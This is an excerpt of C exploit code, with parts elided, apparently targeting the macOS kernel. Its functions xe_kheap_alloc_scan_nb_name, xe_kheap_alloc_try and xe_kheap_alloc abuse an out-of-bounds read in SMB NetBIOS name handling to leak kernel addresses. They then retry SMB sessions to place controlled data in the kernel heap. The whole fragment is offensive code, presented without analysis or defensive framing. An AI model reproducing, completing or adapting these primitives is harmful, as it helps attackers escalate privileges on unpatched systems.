...
int xe_kheap_alloc_scan_nb_name(char* name, size_t len, uint16_t z_elem_size, uintptr_t* out) {
    ...
    if (!xe_vm_kernel_address_valid(allocated_address)) {
        return ENOENT;
    }
    
    /// The `tqe_prev` of a tailq entry is always intialized
    if (!xe_vm_kernel_address_valid(prev)) {
        return ENOENT;
    }
    ...
    if (!xe_vm_kernel_address_valid(next)) {
        return ENOENT;
    }
    ...
    if ((allocated_address & (XE_PAGE_SIZE - 1)) % z_elem_size != 0) {
        return ENOENT;
    }
...
int xe_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, uint8_t sa_family, const char* data, uint8_t data_size, uint8_t data_offset, struct xe_kheap_alloc_entry* out) {
    xe_assert_cond(alloc_size, <=, 255);
    ...
    xe_assert_cond(data_offset, >=, min_data_offset);
    xe_assert_cond(data_size + data_offset, <=, alloc_size);
    ...
    for (int try = 0; try < MAX_TRIES; try++) {        
        ...
        if (!xe_kheap_alloc_scan_nb_name(server_nb_name, sizeof(server_nb_name), zone_size, &value)) {
            break;
        }
        
        /// Check if OOB read of laddr is a value of type `struct sock_addr_entry` having field `addr`
        /// from zone with element size `zone_size`
        if (!xe_kheap_alloc_scan_nb_name(local_nb_name, sizeof(local_nb_name), zone_size, &value)) {
            break;
        }
    }
...
struct xe_kheap_alloc_entry xe_kheap_alloc(const struct sockaddr_in* smb_addr, uint8_t alloc_size, uint8_t sa_family, const char* data, uint8_t data_size, uint8_t data_offset) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        struct xe_kheap_alloc_entry entry;
        int error = xe_kheap_alloc_try(smb_addr, alloc_size, sa_family, data, data_size, data_offset, &entry);
        if (!error) {
            return entry;
        }
    }
